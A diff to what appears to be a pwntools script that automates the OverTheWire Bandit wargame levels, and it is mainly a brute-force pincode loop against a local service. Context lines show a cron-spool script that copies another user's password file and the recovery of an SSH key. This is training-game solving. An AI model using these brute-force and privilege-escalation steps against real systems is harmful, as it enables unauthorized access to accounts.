@@ -17,7 +17,7 @@ def add_flag():
     global flag, i, user
     i+=1
     user=b"bandit"+bytes(str(i),"ascii")
-    if user not in [b'bandit15', b'bandit16',b'bandit25']:
+    if user not in [b'bandit15', b'bandit16', b'bandit25']:
         flag=flag[2:]
     f.write(user+b":\t"+flag)
     flag=flag[:-1]
@@ -168,8 +168,10 @@ end()
 # bandit15 --> bandit16
 start()
 sh.sendline(b'openssl s_client -quiet -connect 127.0.0.1:30001')
-sh.recvuntil('bandit\nverify return:1\n')
+sh.recvuntil(b'\nverify return:1\n')
 sh.sendline(flag)
+sh.recvline()
+sh.recvline()
 sh.recvline()
 end()
 
@@ -187,7 +189,9 @@ def exploit_bandit16(M):
         start()
         sh.sendline(b'openssl s_client -quiet -connect localhost:'+elem)
         if b"unknown" not in sh.recvline():
-            sh.recvuntil(b'bandit\nverify return:1\n')
+            sh.recvuntil(b'\nverify return:1\n')
+            sh.recvline()
+            sh.recvline()
             sh.sendline(flag)
             if flag not in sh.recvline():
                 f3=open("sshkey","wb")
@@ -250,25 +254,40 @@ sh.sendline(b'echo "cat /etc/bandit_pass/bandit24 >> /tmp/""$folder""/""$name2" 
 sh.sendline(b'chmod -R 777 /tmp/$folder')
 sh.sendline('cp /tmp/$folder/$name /var/spool/bandit24/')
 print("Waiting 60sec for crontab ...")
-time.sleep(60)
+timecount=60
+while timecount>0:
+    print(timecount, end='')
+    time.sleep(0.33)
+    print('.', end='')
+    time.sleep(0.33)
+    print('.', end='')
+    time.sleep(0.33)
+    timecount-=1
+print(timecount)
 sh.sendline('cat /tmp/$folder/$name2')
 sh.recvuntil('$ $ $ $ $ $ $ $ ')
 end()
 
 # bandit24 --> bandit25
 start()
-print("Bruteforcing pincode from 0000 to 9999 ...")
-time.sleep(3)
-sh.sendline(b'export name=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
-sh.sendline(b'mkdir /tmp/$name')
-sh.sendline(b'chmod -R 777 /tmp/$name')
-sh.sendline(b'cd /tmp/$name')
-sh.sendline(b'pwd')
-sh.recvline()
-sh.sendline(b'for i in `seq 1 9999`; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> ./xxx ; done')
-sh.sendline(b'cat xxx | nc localhost 30002')
-#sh.recvuntil(b'Correct')
-sh.recvuntil(b'The password of user bandit25 is ')
+
+def exploit_bandit24(sh):
+    sh.sendline(b'nc localhost 30002')
+    print(sh.recvline())
+    for i in range(10000):
+        pincode='{0:04}'.format(i).encode()
+        sh.sendline(flag+b' '+pincode)
+        print(b'Try: '+pincode)
+        output=sh.recvline()
+        if b'Timeout' in output:
+            sh.sendline(b'nc localhost 30002')
+            print(sh.recvline())
+        elif output!=b'Wrong! Please enter the correct pincode. Try again.\n':
+            print(output)
+            sh.recvuntil(b'The password of user bandit25 is ')
+            return
+
+exploit_bandit24(sh)
 end()
 
 # bandit25 --> bandit26
